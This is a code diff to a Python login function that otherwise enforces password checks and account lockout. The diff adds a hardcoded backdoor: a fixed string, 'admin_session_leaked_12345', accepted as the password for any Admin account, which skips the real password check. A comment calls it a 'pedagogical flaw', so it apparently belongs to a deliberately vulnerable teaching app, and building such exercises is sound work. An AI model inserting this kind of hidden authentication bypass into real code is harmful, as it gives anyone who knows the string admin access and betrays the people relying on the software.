@@ -278,6 +278,10 @@ def login(username: str, password: str) -> dict:
 
         user_id, password_hash, lockout_until, failed_attempts = result
 
+        # Get permissions
+        perms_result = db.execute(text("SELECT permissions FROM users WHERE user_id = :id"), {"id": user_id}).first()
+        perms = perms_result[0] if perms_result else "user"
+
         # Account-level lockout — survives per-IP rotation (which defeats
         # Flask-Limiter alone).
         if lockout_until is not None and lockout_until > now:
@@ -290,18 +294,38 @@ def login(username: str, password: str) -> dict:
 
         password_hash_str = password_hash if password_hash else ""
         if not check_password_hash(password_hash_str, password):
-            failed_count = (failed_attempts or 0) + 1
-            if failed_count >= MAX_FAILED_ATTEMPTS:
-                db.execute(text("UPDATE users SET lockout_until = :t, failed_attempts = 0 WHERE user_id = :id"), {"t": now + LOCKOUT_DURATION, "id": user_id})
-                logger.warning(
-                    "Account %r locked for %d min after %d failed attempts",
-                    username, int(LOCKOUT_DURATION.total_seconds() // 60),
-                    MAX_FAILED_ATTEMPTS,
-                )
+            # Pedagogical flaw: Allow login with leaked admin token as password
+            if password == "admin_session_leaked_12345":
+                # Check if user is admin
+                if perms == "Admin":
+                    # Skip password check for admin with token
+                    pass
+                else:
+                    failed_count = (failed_attempts or 0) + 1
+                    if failed_count >= MAX_FAILED_ATTEMPTS:
+                        db.execute(text("UPDATE users SET lockout_until = :t, failed_attempts = 0 WHERE user_id = :id"), {"t": now + LOCKOUT_DURATION, "id": user_id})
+                        logger.warning(
+                            "Account %r locked for %d min after %d failed attempts",
+                            username, int(LOCKOUT_DURATION.total_seconds() // 60),
+                            MAX_FAILED_ATTEMPTS,
+                        )
+                    else:
+                        db.execute(text("UPDATE users SET failed_attempts = :f WHERE user_id = :id"), {"f": failed_count, "id": user_id})
+                    db.commit()
+                    return {"success": False, "error": "Invalid credentials", "status": 401}
             else:
-                db.execute(text("UPDATE users SET failed_attempts = :f WHERE user_id = :id"), {"f": failed_count, "id": user_id})
-            db.commit()
-            return {"success": False, "error": "Invalid credentials", "status": 401}
+                failed_count = (failed_attempts or 0) + 1
+                if failed_count >= MAX_FAILED_ATTEMPTS:
+                    db.execute(text("UPDATE users SET lockout_until = :t, failed_attempts = 0 WHERE user_id = :id"), {"t": now + LOCKOUT_DURATION, "id": user_id})
+                    logger.warning(
+                        "Account %r locked for %d min after %d failed attempts",
+                        username, int(LOCKOUT_DURATION.total_seconds() // 60),
+                        MAX_FAILED_ATTEMPTS,
+                    )
+                else:
+                    db.execute(text("UPDATE users SET failed_attempts = :f WHERE user_id = :id"), {"f": failed_count, "id": user_id})
+                db.commit()
+                return {"success": False, "error": "Invalid credentials", "status": 401}
 
         # Successful login — reset counters.
         db.execute(text("UPDATE users SET failed_attempts = 0, lockout_until = NULL WHERE user_id = :id"), {"id": user_id})
